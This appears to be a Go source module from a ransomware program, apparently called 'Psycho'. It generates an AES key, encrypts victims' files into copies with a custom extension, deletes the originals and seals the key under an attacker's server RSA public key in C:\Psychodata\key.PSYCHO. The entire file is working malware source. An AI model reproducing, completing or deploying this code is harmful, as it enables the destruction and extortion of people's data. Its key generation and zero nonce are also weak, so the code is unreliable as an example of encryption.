package encryption

import (
	"crypto/rsa"
	"crypto/x509"
	"crypto/md5"
	"crypto/aes"
	"crypto/cipher"
	"encoding/pem"
	"encoding/base64"
	"encoding/hex"
	"math/rand"
	cryptorand "crypto/rand"
	"io/ioutil"
	"errors"
	"time"
	"fmt"
	"os"
)

//checks if a file exists
func fileExists(filename string) bool {
    _, err := os.Stat(filename)
    if os.IsNotExist(err) {
        return false
    }
    return true
}

//create a random 32 character aes key
func RandomAeskey() string {
	rand.Seed(time.Now().UnixNano())
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	s := make([]rune, 32)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

//export pem string from a rsa.PublicKey struct object
func Publickeytostr(pubkey *rsa.PublicKey) (string, error) {
    pubkey_bytes, err := x509.MarshalPKIXPublicKey(pubkey)
    if err != nil {
            return "", err
    }
    pubkey_pem := pem.EncodeToMemory(
            &pem.Block{
                    Type:  "RSA PUBLIC KEY",
                    Bytes: pubkey_bytes,
            },
    )

    return string(pubkey_pem), nil
}

//import a rsa.PublicKey object from pem string
func Strtopublickey(pubPEM string) (*rsa.PublicKey, error) {
    block, _ := pem.Decode([]byte(pubPEM))
    if block == nil {
            return nil, errors.New("failed to parse PEM block containing the key")
    }

    pub, err := x509.ParsePKIXPublicKey(block.Bytes)
    if err != nil {
            return nil, err
    }

    switch pub := pub.(type) {
    case *rsa.PublicKey:
            return pub, nil
    default:
            break // fall through
    }
    return nil, errors.New("Key type is not RSA")
}

//encrypts a text with a rsa public key
func RsaEncrypt(pubkey *rsa.PublicKey, text string) string {
	encryptedtext, err := rsa.EncryptOAEP(md5.New(), cryptorand.Reader, pubkey, []byte(text), nil)
	if  err != nil {
		fmt.Println(err)
	}
	return string(encryptedtext)
}

//encryption struct
type Encryption struct {
	Serverpublickey string
	Key string
	Fileextension string
}

//create new Encryption struct object
func NewEncryption(serverpubkey string, fileextension string) Encryption {
	_ = os.Mkdir("C:\\Psychodata", 0755)
	return Encryption {
		Serverpublickey: serverpubkey,
		Key: RandomAeskey(),
		Fileextension: fileextension,
	}
}

//encrypts a file
func (enc *Encryption) Encryptfile(filename string) error {
	readdata, err1 := ioutil.ReadFile(filename)
	if err1 != nil {
		return err1
	}
	data := base64.StdEncoding.EncodeToString(readdata)
	block, err2 := aes.NewCipher([]byte(enc.Key))
	if err2 != nil {
		return err2
	}
	gcm, err3 := cipher.NewGCM(block)
	if err3 != nil {
		return err3
	}
	nonce := make([]byte, gcm.NonceSize())
	ciphertext := gcm.Seal(nonce, nonce, []byte(data), nil)
	ioutil.WriteFile(filename + enc.Fileextension, ciphertext, 0644)
	os.Remove(filename)
	return nil
}

//creates a test.PSYCHO file to check password
func (enc *Encryption) Createtest() {
	if !fileExists("C:\\Psychodata\\test.PSYCHO") {
		data := base64.StdEncoding.EncodeToString([]byte("psycho"))
		block, _ := aes.NewCipher([]byte(enc.Key))
		gcm, _ := cipher.NewGCM(block)
		nonce := make([]byte, gcm.NonceSize())
		text := gcm.Seal(nonce, nonce, []byte(data), nil)
		ioutil.WriteFile("C:\\Psychodata\\test.PSYCHO", text, 0644)
	}
}

//deletes the rsa random key from memory and writes encrypted key on disk
func (enc *Encryption) End() {
	serverpublickey, _ := Strtopublickey(enc.Serverpublickey)
	encryptedkey := RsaEncrypt(serverpublickey, enc.Key)
	if !fileExists("C:\\Psychodata\\key.PSYCHO") {
	ioutil.WriteFile("C:\\Psychodata\\key.PSYCHO", []byte(hex.EncodeToString([]byte(encryptedkey))), 0644)
	enc.Key = ""
	}
}